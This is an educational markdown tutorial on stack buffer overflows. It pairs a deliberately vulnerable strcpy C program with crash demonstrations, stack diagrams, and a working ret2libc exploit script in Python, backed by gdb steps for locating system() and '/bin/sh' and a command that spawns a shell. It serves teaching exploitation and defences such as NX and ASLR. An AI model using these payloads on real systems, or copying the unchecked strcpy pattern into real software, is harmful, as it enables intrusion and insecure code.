# Buffer Overflows

## Basic Buffer Overflow

### Example Vulnerable Code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo(char *str) {
    char buffer[8] = {0};
    strcpy(buffer, str);  // vulnerable function!
}

int main(int argc, char **argv) {
    if (argc < 2)
        exit(EXIT_FAILURE);

    foo(argv[1]);
    puts("Everything is fine!");
    return EXIT_SUCCESS;
}
```

### Demonstration:
```bash
./vulnerable $(python -c 'print("A"*4)')
# Output: Everything is fine!

./vulnerable $(python -c 'print("A"*12)')
# Output: Everything is fine! (padding reached but not overflowed)

./vulnerable $(python -c 'print("A"*14)')
# Output: Segmentation fault (buffer overflow!)
```

### Stack Layout During Overflow:
```
|   Higher Addresses   |
|----------------------|
|     saved eip        |
|     saved ebp        |
|      buffer[]        |
|----------------------|
|   Lower Addresses    |
```

### Exploitation Steps (AlephOne Method):
1. Take control of execution flow (overwrite saved `eip`).
2. Inject shellcode into the buffer.
3. Use a NOP-sled (`0x90`) to improve shellcode execution reliability.

---

## Advanced Buffer Overflows

### Security Mechanisms:
- **Nonexecutable Stack (NX/DEP)**: Prevents stack from being both writable and executable.
- **Address Space Layout Randomization (ASLR)**: Randomizes memory addresses to complicate exploitation.

#### Check Security Measures (`checksec`):
```bash
checksec --file=executable
```

---

## Return-to-libc Technique

When stack execution is prevented (NX enabled), exploit the vulnerability by executing existing libc functions instead of injecting shellcode.

### Concept:
- Overwrite saved `eip` with address of a libc function (e.g., `system()`).
- Pass arguments by stacking them after the function address on the call stack.

### Stack Layout for ret2libc:
```
|    Higher Addresses    |
|------------------------|
| Address of system()    | (saved eip overwrite)
| Return address (fake)  |
| Address of "/bin/sh"   |
|------------------------|
|    Lower Addresses     |
```

### Example Exploit Script (`ret2libc`):
```python
#!/usr/bin/python
import sys

# Padding to reach saved eip
buffer = b'A' * 76

# system() address in libc
buffer += b'\x00\xe0\xdf\xf7'

# Fake return address (to exit())
buffer += b'\x50\x09\xdf\xf7'

# Argument address ("/bin/sh")
buffer += b'\x3c\x53\xf4\xf7'

# Argument for exit()
buffer += b'\x00\x00\x00\x00'

# Output payload
sys.stdout.buffer.write(buffer)
```

### Steps to Exploit (`ret2libc`):
1. Identify padding size.
2. Find `system()` and `"/bin/sh"` addresses in libc:
    ```bash
    gdb ./vulnerable
    (gdb) print system
    (gdb) find 0xf7f2b000, 0xf7f4eb88, "/bin/sh"
    ```
3. Run the exploit:
    ```bash
    (./exploit.py ; cat) | ./vulnerable
    ```

### Resolving Segmentation Faults (Chaining Calls):
To avoid segmentation fault after executing `system("/bin/sh")`, chain another libc function call (e.g., `exit(0)`).

#### Stack Layout for Chaining Calls:
```
|    Higher Addresses    |
|------------------------|
| Address of system()    |
| Address of exit()      | (Next function to call)
| "/bin/sh" address      | (system argument)
| Argument for exit (0)  |
|------------------------|
|    Lower Addresses     |
```

---

## Handling Restrictions

### What if NULL-bytes (`0x00`) Are Forbidden?
- Avoid direct injection of NULL-bytes in the payload.
- Use alternative exploitation methods or encode payload.

### Techniques:
- **ROP Chains**: Execute snippets of existing code (gadgets).
- **Egg-Hunting**: Small payload that searches memory for a larger payload.
